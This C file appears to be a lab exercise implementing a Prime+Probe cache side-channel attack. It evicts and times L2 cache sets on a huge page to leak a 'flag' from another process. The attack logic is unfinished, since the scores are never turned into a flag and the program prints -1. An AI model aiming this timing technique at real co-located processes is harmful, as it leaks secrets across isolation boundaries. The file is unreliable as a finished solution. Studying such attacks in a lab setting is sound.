#include "util.h"
// mman library to be used for hugepage allocations (e.g. mmap or posix_memalign only)
#include <sys/mman.h>

#define HUGE_PAGE_SIZE (2 * 1024 * 1024)
#define L2_STEP_SIZE 65536 // 2^16 allows us to modify the tag, while keeping the set index the same
#define MISS_THRESHOLD 140 // based on timing data from P1


void* allocate_huge_page() {
        void *buffer = mmap(NULL, HUGE_PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);

        if (buffer == (void*) - 1) {
                perror("mmap() error\n");
                exit(EXIT_FAILURE);
        }

        return buffer;
}

uint8_t* get_set_addr(uint8_t *buffer, int target_set) {
	// Shift the set index to te left by 6 bits, to align int with the index bits
	int set_offset = target_set << 6;
	return buffer + set_offset;
}

void evict_l2_set(uint8_t *buffer, int target_set) {
        uint8_t *set_addr = get_set_addr(buffer, target_set);
        volatile uint8_t tmp;

        // Access 16 different cache lines that map to the same L2 set
        for (int i=0; i < 16; i++) {
                // Jump between lines in the cache set by modifying the physical tag bits
                uint8_t *eviction_addr = set_addr + (i * L2_STEP_SIZE);
                tmp = *eviction_addr;

                asm volatile("mfence" ::: "memory");
        }
}

int probe_cache_set(uint8_t *buffer, int target_set) {
        uint8_t *set_addr = get_set_addr(buffer, target_set);
        int misses = 0;

        for (int i=0; i < 16; i++) {
                // Need some binary operation to scramble access pattern
                int mixed_i = (i * 5) & 0xF;

                uint8_t *probe_addr = set_addr + (mixed_i * L2_STEP_SIZE);

                asm volatile("lfence" ::: "memory"); // Start Fence
                uint32_t probe_time = measure_one_block_access_time(probe_addr);
                asm volatile("lfence" ::: "memory"); // End Fence

                if (probe_time > MISS_THRESHOLD) {
                        misses++;
                }
        }
        return misses;
}


int main(int argc, char const *argv[]) {
    	
	void *buffer = allocate_huge_page();
        for (int i = 0; i < HUGE_PAGE_SIZE; i += 4096){
                ((uint8_t*)buffer)[i] = 1;
        }

	int flag = -1;
	int scores[1024] = {0};

	for (int target_set = 0; target_set < 1024; target_set++) {
		evict_l2_set(buffer, target_set);

		for (volatile int w = 0; w < 500; w++) {}

		int misses = probe_cache_set(buffer, target_set);

		if (misses > 2) {
			scores[target_set]++;
		}


	}
    printf("Flag: %d\n", flag);
    return 0;
}
